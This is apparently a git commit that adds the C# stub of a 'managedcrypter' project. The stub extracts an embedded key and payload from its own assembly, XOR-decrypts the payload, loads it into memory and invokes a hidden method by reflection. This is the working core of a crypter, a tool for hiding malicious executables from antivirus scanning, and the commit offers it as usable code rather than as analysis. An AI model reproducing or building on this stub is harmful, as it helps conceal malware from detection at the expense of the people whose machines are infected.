abd2ac16f8f0df01ff41a3ede64a7c8f721914ac
Ullrich <_ullrich_@outlook.com>
2015-07-22 19:26:18 -0500

    untracked files :\

---
+++ managedcrypter/stub/stub_class.cs
@@ -0,0 +1,41 @@
+﻿using System;
+using System.Reflection;
+
+namespace stub
+{
+    class @class
+    {
+        /* What this stub does:
+            ---> Gets library key file data
+            ---> Get library file data
+            ---> Decodes library -> b64
+            ---> Decrypts library -> xor
+            ---> Loads assembly 
+            ---> Invokes { class.void }
+        */
+
+        static void Main(string[] args)
+        {
+            Assembly asm = Assembly.GetExecutingAssembly();
+
+            byte[] key = KeyFile.GetKeyFile(asm);
+            byte[] lib = GetLib.GetExe(asm);
+
+            xor(lib, key);
+
+            asm = Assembly.Load(lib);
+
+            Type t = asm.GetType("A.class1");
+
+            t.InvokeMember("method1", BindingFlags.InvokeMethod | BindingFlags.Static | BindingFlags.Public, null, null, null);
+        }
+
+
+        static void xor(byte[] input, byte[] key)
+        {
+            for (int i = 0; i < input.Length; i++)
+                input[i] ^= key[i % key.Length];
+        }
+
+    }
+}
